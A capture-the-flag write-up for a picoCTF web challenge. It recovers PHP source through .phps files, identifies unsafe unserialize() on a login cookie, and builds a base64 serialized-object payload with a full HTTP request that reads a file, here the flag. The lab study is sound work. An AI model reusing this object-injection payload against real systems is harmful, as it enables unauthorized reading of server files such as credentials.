## Description
Try to recover the flag stored on this website http://mercury.picoctf.net:3449/

## Solution
We are given a login page. seem the login page is not vulnerable.
Checking `robots.txt` hints on:

```
User-agent: *
Disallow: /admin.phps
```

But checking `admin.phps` path doesn't give us anything:
maybe we need to check phps pathes instead of .php.
So checking `index.phps`:
```php
<?php
require_once("cookie.php");

if(isset($_POST["user"]) && isset($_POST["pass"])){
	$con = new SQLite3("../users.db");
	$username = $_POST["user"];
	$password = $_POST["pass"];
	$perm_res = new permissions($username, $password);
	if ($perm_res->is_guest() || $perm_res->is_admin()) {
		setcookie("login", urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), "/");
		header("Location: authentication.php");
		die();
	} else {
		$msg = '<h6 class="text-center" style="color:red">Invalid Login.</h6>';
	}
}
?>
```

seems like the `phps` files show the raw php. Let's use this feature on other files on server and see if we can view their sources.

and checking `authentication.phps`:
```php
<?php

class access_log
{
	public $log_file;

	function __construct($lf) {
		$this->log_file = $lf;
	}

	function __toString() {
		return $this->read_log();
	}

	function append_to_log($data) {
		file_put_contents($this->log_file, $data, FILE_APPEND);
	}

	function read_log() {
		return file_get_contents($this->log_file);
	}
}

require_once("cookie.php");
if(isset($perm) && $perm->is_admin()){
	$msg = "Welcome admin";
	$log = new access_log("access.log");
	$log->append_to_log("Logged in at ".date("Y-m-d")."\n");
} else {
	$msg = "Welcome guest";
}
?>
```

in this file, the function `file_get_contents` is vulnerable to LFI.
But we need to find a way to input our value in this method.

Also it seem there is another file to handle cookies of this site. checking `cookie.phps`:
```php
<?php
session_start();

class permissions
{
	public $username;
	public $password;

	function __construct($u, $p) {
		$this->username = $u;
		$this->password = $p;
	}

	function __toString() {
		return $u.$p;
	}

	function is_guest() {
		$guest = false;

		$con = new SQLite3("../users.db");
		$username = $this->username;
		$password = $this->password;
		$stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
		$stm->bindValue(1, $username, SQLITE3_TEXT);
		$stm->bindValue(2, $password, SQLITE3_TEXT);
		$res = $stm->execute();
		$rest = $res->fetchArray();
		if($rest["username"]) {
			if ($rest["admin"] != 1) {
				$guest = true;
			}
		}
		return $guest;
	}

        function is_admin() {
                $admin = false;

                $con = new SQLite3("../users.db");
                $username = $this->username;
                $password = $this->password;
                $stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
                $stm->bindValue(1, $username, SQLITE3_TEXT);
                $stm->bindValue(2, $password, SQLITE3_TEXT);
                $res = $stm->execute();
                $rest = $res->fetchArray();
                if($rest["username"]) {
                        if ($rest["admin"] == 1) {
                                $admin = true;
                        }
                }
                return $admin;
        }
}

if(isset($_COOKIE["login"])){
	try{
		$perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
		$g = $perm->is_guest();
		$a = $perm->is_admin();
	}
	catch(Error $e){
		die("Deserialization error. ".$perm);
	}
}

?>
```

`unserialize` method is also vulnerable to php objection injection.
So the attack scenario is accessible now:
- we need to pass our pyaload in login value in cookie which is a serialized object.
- because we want to read flag file, we should use access_log class `read_log` method.
- to see the `../flag` file contents, we need to create a serialized string of access_log which `log_file` value is set to `../flag` (Note it should be base64 encoded)

Ok now we create a instance of `access_log` with log_file equal to `/etc/passwd`.


```php
class access_log
{
	public $log_file;

	function __construct($lf) {
		$this->log_file = $lf;
	}
}

$serializer = new access_log("/etc/passwd");
$serialized_value = serialize($serializer);
echo base64_encode($serialized_value);
```
and run it with php shell using `php -a` as follow:

```bash
$ php -a
Interactive shell

php > class access_log
{
        public $log_file;

        function __construct($lf) {
                $this->log_file = $lf;
        }
}

$serializer = new access_log("../flag");
$serialized_value = serialize($serializer);
echo base64_encode($serialized_value);
TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9
```

and send `TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9` in `login` value in `cookie` like follow:

```
GET /authentication.php HTTP/1.1
Host: mercury.picoctf.net:3449
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 28
Origin: http://mercury.picoctf.net:3449
Connection: close
Referer: http://mercury.picoctf.net:3449/index.php
Cookie: auth_name=TE1YOFZTSU0zYWh1VkpjYUVNQTdXVG01clZRbVplb0NWQWdSZ1hPNCsxRUhMQ3FQUEdWdEttaWhXbm1qbW1Ja3JDWVpLWW8vYVlMTVZsazVCZXlkWkpIZHhyMzRpMmFMTUQ2b1Q1dGtuQmQyeGZNQUlaNFpGaGwzdzc5MkM3TXQ=; name=18; PHPSESSID=j62q4iq5g1nosspa3vvp9puc14; login=TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9
Upgrade-Insecure-Requests: 1

```

Note to send request to `authenticaion.php` path. because in this path the access_log object is deserialized and access.

and will print the contents of `../flag` file:
```
HTTP/1.1 200 OK
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-type: text/html; charset=UTF-8

Deserialization error. picoCTF{XXXXXXX}
```